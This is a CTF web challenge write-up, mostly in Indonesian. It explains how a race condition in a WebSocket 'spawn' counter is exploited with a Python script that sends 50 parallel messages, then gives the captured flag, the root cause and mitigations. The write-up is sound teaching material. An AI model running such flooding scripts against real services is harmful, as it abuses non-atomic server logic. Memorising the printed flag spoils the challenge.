# Waguri1 — Web CTF Writeup

**Category:** Web
**Difficulty:** Easy–Medium
**Flag:** `LYKNCTF{cb1f7e69904b4af5b3200d5bf0d3ad48}`

---

## Challenge Description

> The SPAWN button looks harmless, but there's something behind it. Can you find it out?

Target: `http://<host>:8080/`

---

## 1. Recon

Mengakses halaman utama menampilkan sebuah tombol **SPAWN** dengan judul halaman **"Spawn Race"**. Melihat source HTML, ditemukan bahwa halaman ini membuka koneksi **WebSocket** ke host yang sama:

```js
const socket = new WebSocket(`${protocol}//${window.location.host}`);
```

Ketika tombol SPAWN diklik, client mengirim pesan:

```json
{ "type": "spawn" }
```

Dan server membalas dengan pesan bertipe `spawned`:

```json
{ "type": "spawned", "image": "/images/1.gif", "sound": "/sounds/5.mp3", "spawnId": 1 }
```

Client kemudian menampilkan gambar & suara tersebut di layar (efek visual saja, tidak berkaitan langsung dengan flag).

**Petunjuk penting:** judul challenge adalah **"Spawn Race"** — mengindikasikan adanya **race condition** yang harus dieksploitasi, bukan cuma UI semata.

---

## 2. Hipotesis

Karena setiap klik tombol mengirim satu pesan `spawn` dan mendapat balasan berisi `spawnId` yang increment, kemungkinan besar server menyimpan sebuah **counter global** (misalnya jumlah total spawn) dengan pola **check-then-act** yang tidak *thread-safe* / tidak atomik. Contoh pseudocode rentan di server:

```js
if (spawnCounter === WINNING_ID) {
  response.race = "won";
  response.flag = FLAG;
}
spawnCounter++;
```

Jika banyak request `spawn` dikirim **secara bersamaan (concurrent)**, ada kemungkinan beberapa request membaca nilai counter yang sama sebelum increment selesai diproses — sehingga kondisi "menang" bisa lebih mudah terpicu, atau nilai spawnId tertentu (yang seharusnya cuma dicapai satu klien pertama) bisa "dicuri"/didapat lewat flooding.

---

## 3. Eksploitasi — Race Condition via WebSocket Flooding

Alih-alih klik tombol satu per satu secara manual, dibuat script Python untuk membuka satu koneksi WebSocket lalu **mengirim banyak pesan `spawn` sekaligus secara paralel** menggunakan `asyncio.gather`, sehingga semua request diproses server hampir bersamaan:

```python
import asyncio, websockets, json

async def spam():
    async with websockets.connect('ws://<host>:8080/') as ws:
        await asyncio.gather(*[ws.send(json.dumps({'type': 'spawn'})) for _ in range(50)])
        try:
            while True:
                msg = await asyncio.wait_for(ws.recv(), timeout=1)
                print(msg)
        except asyncio.TimeoutError:
            pass

asyncio.run(spam())
```

### Hasil

Dari 50 request yang dikirim paralel, salah satu balasan (spawnId ke-6) berisi field tambahan `race: "won"` beserta flag:

```json
{"type":"spawned","image":"/images/1.gif","sound":"/sounds/4.mp3","spawnId":6,"race":"won","flag":"LYKNCTF{cb1f7e69904b4af5b3200d5bf0d3ad48}"}
```

Request lain (spawnId 1–5, 7–50) hanya berisi data spawn biasa tanpa flag.

---

## 4. Root Cause

- Server memiliki logika "pemenang" yang bergantung pada urutan/nilai counter spawn yang diproses secara **non-atomik**.
- Karena tidak ada locking/mutex saat memproses request `spawn` secara bersamaan, mengirim banyak request dalam waktu hampir bersamaan (race) memungkinkan kondisi kemenangan tercapai/terpicu jauh lebih cepat dan lebih pasti dibanding hanya mengklik tombol secara normal satu-satu.
- Ini adalah contoh klasik **race condition (TOCTOU – Time Of Check To Time Of Use)** pada aplikasi berbasis WebSocket/state server-side.

---

## 5. Mitigasi (Rekomendasi Perbaikan)

1. Gunakan **atomic increment/compare-and-swap** pada counter, bukan read-then-write terpisah.
2. Terapkan **locking/mutex** per-koneksi atau per-session saat memproses event kritikal.
3. Jangan mengandalkan urutan pesan client sebagai satu-satunya penentu logika sensitif (seperti pemberian flag/reward).
4. Rate-limit jumlah pesan WebSocket per detik dari satu koneksi/IP.

---

## Tools yang Digunakan

- `curl` — recon endpoint & header
- `python3` + `websockets` (asyncio) — membuat koneksi WebSocket dan mengirim request secara paralel untuk memicu race condition

## Flag

```
LYKNCTF{cb1f7e69904b4af5b3200d5bf0d3ad48}
```
